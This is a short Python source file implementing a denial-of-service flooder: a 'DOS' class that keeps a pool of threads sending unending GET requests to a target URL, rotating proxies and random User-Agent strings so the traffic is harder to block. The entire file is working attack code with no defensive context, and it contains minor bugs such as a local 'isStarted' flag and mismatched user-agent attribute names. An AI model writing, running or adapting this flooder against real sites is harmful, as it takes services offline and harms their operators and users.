import threading, requests, random, string

class DOS:
    target = ""
    thread_number = 0
    thread_pool = []

    proxy_list = []
    user_agent_list = []

    isStarted = False

    def __init__(self, target, thread_number, proxy_list = [], user_agent = []):
        self.target = target
        self.thread_number = thread_number
        self.proxy_list = proxy_list
        self.user_agent = user_agent

    def target_request(self, _headers, _proxy=None):
        try:
            if _proxy:
                print(requests.get(self.target, headers=_headers, proxies=_proxy))
            else:
                print(requests.get(self.target, headers=_headers))
        except:
            pass

    def start(self):
        isStarted = True
        
        while isStarted:
            # print(len(self.thread_pool))
            if len(self.thread_pool) < self.thread_number:
                headers = {}
                new_request = None

                if self.user_agent_list:
                    headers['User-agent'] = self.get_random_user_agent()
                else:
                    headers['User-agent'] = self.get_random_string(16)

                if self.proxy_list:
                    selected_proxy = random.choice(self.proxy_list)
                    # print(selected_proxy)
                    proxy={
                        "http": selected_proxy,
                        "https": selected_proxy
                    }

                    new_request = threading.Thread(target=self.target_request, args=[headers, proxy])
                else:
                    new_request = threading.Thread(target=self.target_request, args=[headers])

                self.thread_pool.append(new_request)

                new_request.start()


                self.remove_ended_threads()

    def get_random_user_agent(self):
        return random.choice(self.user_agent)

    def get_random_proxy(self):
        return random.choice(self.proxy_list)

    def get_random_string(self, length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))
    
    def remove_ended_threads(self):
        for thread in self.thread_pool:
            #print(thread.is_alive())
            if not thread.is_alive():
                self.thread_pool.remove(thread)
                #print("Removed")
            else:
                pass


